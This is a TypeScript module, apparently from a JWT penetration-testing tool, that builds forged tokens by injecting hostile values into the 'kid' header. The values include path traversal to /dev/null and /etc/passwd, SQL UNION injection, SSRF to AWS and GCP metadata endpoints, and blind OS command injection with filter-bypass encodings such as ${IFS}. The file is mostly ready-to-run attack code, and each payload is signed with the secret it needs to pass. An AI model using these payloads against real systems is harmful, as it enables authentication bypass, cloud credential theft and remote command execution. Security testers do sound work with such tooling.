/**
 * KID (Key ID) Injection Attacks
 *
 * Manipulates the "kid" JWT header parameter to:
 *  - SQL injection (if the server looks up the key from a DB)
 *  - Path traversal (if the server reads a key file by kid)
 *  - SSRF via absolute URL (if the server fetches the key by kid)
 *  - Known weak/predictable kid values
 *
 * For SQL and path traversal payloads we also sign with a known "secret"
 * that corresponds to the injected payload (e.g. /dev/null = empty file,
 * so HMAC secret = empty string).
 */

import { signHMAC, encodeUnsigned, buildJWT } from "../crypto/jwt.js";
import type { ParsedJWT, AttackResult } from "../types.js";
import { nanoid } from "../util.js";

interface KidPayload {
  kid: string;
  secret: Buffer;
  description: string;
}

const PATH_TRAVERSAL_KIDS: KidPayload[] = [
  {
    kid: "../../../../dev/null",
    secret: Buffer.from(""),
    description: "Path traversal to /dev/null (empty secret)",
  },
  {
    kid: "../../../../../../dev/null",
    secret: Buffer.from(""),
    description: "Deeper path traversal to /dev/null (empty secret)",
  },
  {
    kid: "/dev/null",
    secret: Buffer.from(""),
    description: "Absolute path /dev/null (empty secret)",
  },
  {
    kid: "../../../../proc/sys/kernel/randomize_va_space",
    secret: Buffer.from("2"),
    description: "Path traversal to Linux kernel file (typical content: '2')",
  },
  {
    kid: "../../../../etc/passwd",
    secret: Buffer.from(""),
    description: "Path traversal to /etc/passwd",
  },
  {
    kid: "../../../../windows/win.ini",
    secret: Buffer.from(""),
    description: "Path traversal to Windows win.ini",
  },
];

const SQL_INJECTION_KIDS: KidPayload[] = [
  {
    kid: "' UNION SELECT 'secret'-- -",
    secret: Buffer.from("secret"),
    description: "SQL UNION injection returning 'secret' as the key",
  },
  {
    kid: "' UNION SELECT 'a'-- -",
    secret: Buffer.from("a"),
    description: "SQL UNION injection returning 'a' as the key",
  },
  {
    kid: "' OR '1'='1",
    secret: Buffer.from(""),
    description: "SQL OR injection (tautology)",
  },
  {
    kid: "1 OR 1=1",
    secret: Buffer.from(""),
    description: "SQL numeric OR injection",
  },
  {
    kid: "\" UNION SELECT 'secret'-- -",
    secret: Buffer.from("secret"),
    description: "SQL UNION injection (double-quote variant)",
  },
];

const SSRF_KIDS: KidPayload[] = [
  {
    kid: "http://169.254.169.254/latest/meta-data/",
    secret: Buffer.from(""),
    description: "SSRF to AWS IMDSv1 metadata endpoint",
  },
  {
    kid: "http://metadata.google.internal/computeMetadata/v1/",
    secret: Buffer.from(""),
    description: "SSRF to GCP metadata endpoint",
  },
  {
    kid: "http://localhost/",
    secret: Buffer.from(""),
    description: "SSRF to localhost",
  },
];

const WEAK_KIDS: KidPayload[] = [
  {
    kid: "0",
    secret: Buffer.from("secret"),
    description: "Kid=0 with secret='secret'",
  },
  {
    kid: "1",
    secret: Buffer.from("secret"),
    description: "Kid=1 with secret='secret'",
  },
  {
    kid: "",
    secret: Buffer.from(""),
    description: "Empty kid with empty secret",
  },
];

// ── OS command injection via kid (time-delay / blind RCE) ───────────────────
// If the server passes the kid into an OS shell during key lookup, an injected
// command runs. We inject a command that pauses for DELAY_SECONDS; the caller
// (index.ts) compares the response time against the baseline — a matching delay
// confirms command injection. The signature is irrelevant (the injection fires at
// kid-processing time), so these are signed HS256 with an empty secret.
const DELAY_SECONDS = 3;

interface CmdInjectionKid {
  kid: string;           // the injected kid value
  os: string;            // "Linux" | "Windows" | "Linux/Windows"
  command: string;       // human description of the injected delay command
  spaceEncoding: string; // how the space between command and argument is encoded
}

// NOTE: "\t" below is a real tab character (a valid shell argument separator).
const COMMAND_INJECTION_KIDS: CmdInjectionKid[] = [
  // Linux `sleep 3` with different space-encoding techniques (filter/WAF bypass)
  { kid: "x; sleep 3",                 os: "Linux",         command: "sleep 3", spaceEncoding: "plain space" },
  { kid: "x;sleep${IFS}3",             os: "Linux",         command: "sleep 3", spaceEncoding: "${IFS}" },
  { kid: "x;sleep$IFS$93",             os: "Linux",         command: "sleep 3", spaceEncoding: "$IFS$9" },
  { kid: "x;{sleep,3}",                os: "Linux",         command: "sleep 3", spaceEncoding: "brace expansion {,} (no space)" },
  { kid: "x;sleep\t3",                 os: "Linux",         command: "sleep 3", spaceEncoding: "tab (\\t)" },
  { kid: "x|sleep 3",                  os: "Linux",         command: "sleep 3", spaceEncoding: "plain space (pipe separator)" },
  { kid: "x`sleep 3`",                 os: "Linux",         command: "sleep 3", spaceEncoding: "plain space (backtick subshell)" },
  { kid: "x$(sleep 3)",                os: "Linux",         command: "sleep 3", spaceEncoding: "plain space ($() subshell)" },
  // Windows delays: `timeout` and `ping` (each ~3s)
  { kid: "x& timeout /t 3",            os: "Windows",       command: "timeout /t 3",            spaceEncoding: "plain space (& separator)" },
  { kid: "x& ping -n 4 127.0.0.1",     os: "Windows",       command: "ping -n 4 127.0.0.1 (~3s)", spaceEncoding: "plain space (& separator)" },
  // Cross-platform: sleep runs on Linux; on Windows it fails and || falls through to timeout
  { kid: "x; sleep 3 || timeout /t 3", os: "Linux/Windows", command: "sleep 3 || timeout /t 3", spaceEncoding: "plain space (|| fallback)" },
];

function buildCommandInjectionAttack(parsed: ParsedJWT, p: CmdInjectionKid): AttackResult {
  const alg = (parsed.header.alg as string).startsWith("HS")
    ? (parsed.header.alg as "HS256" | "HS384" | "HS512")
    : "HS256";

  const header = { ...parsed.header, alg, kid: p.kid };
  const jwt = signHMAC(header, parsed.payload, Buffer.from(""), alg);

  return {
    id: nanoid(),
    technique: "kidInject",
    techniqueName: `KID Injection — OS Command Injection (${p.os})`,
    description:
      `Injects a kid containing an OS command that pauses for ${DELAY_SECONDS}s ` +
      `(${p.command}; space encoded as ${p.spaceEncoding}). If the server passes the kid into a ` +
      `shell during key lookup, the response is delayed ~${DELAY_SECONDS}s versus the baseline.`,
    modifiedJWT: jwt,
    timestamp: Date.now(),
    hmacSecret: "",
    injectedCommand: p.command,
    spaceEncoding: p.spaceEncoding,
    expectedDelayMs: DELAY_SECONDS * 1000,
  };
}

function buildHSAttack(
  parsed: ParsedJWT,
  payload: KidPayload,
  category: string
): AttackResult {
  const alg = (parsed.header.alg as string).startsWith("HS")
    ? (parsed.header.alg as "HS256" | "HS384" | "HS512")
    : "HS256";

  const header = { ...parsed.header, alg, kid: payload.kid };
  const jwt = signHMAC(header, parsed.payload, payload.secret, alg);

  return {
    id: nanoid(),
    technique: "kidInject",
    techniqueName: `KID Injection — ${category}`,
    description: `Injects kid="${payload.kid}" — ${payload.description}`,
    modifiedJWT: jwt,
    timestamp: Date.now(),
    hmacSecret: payload.secret.toString("utf8"),
  };
}

export function buildKIDInjectionAttacks(parsed: ParsedJWT): AttackResult[] {
  const results: AttackResult[] = [];

  for (const payload of PATH_TRAVERSAL_KIDS) {
    results.push(buildHSAttack(parsed, payload, "Path Traversal"));
  }
  for (const payload of SQL_INJECTION_KIDS) {
    results.push(buildHSAttack(parsed, payload, "SQL Injection"));
  }
  for (const payload of SSRF_KIDS) {
    results.push(buildHSAttack(parsed, payload, "SSRF"));
  }
  for (const payload of WEAK_KIDS) {
    results.push(buildHSAttack(parsed, payload, "Weak KID"));
  }
  for (const payload of COMMAND_INJECTION_KIDS) {
    results.push(buildCommandInjectionAttack(parsed, payload));
  }

  return results;
}
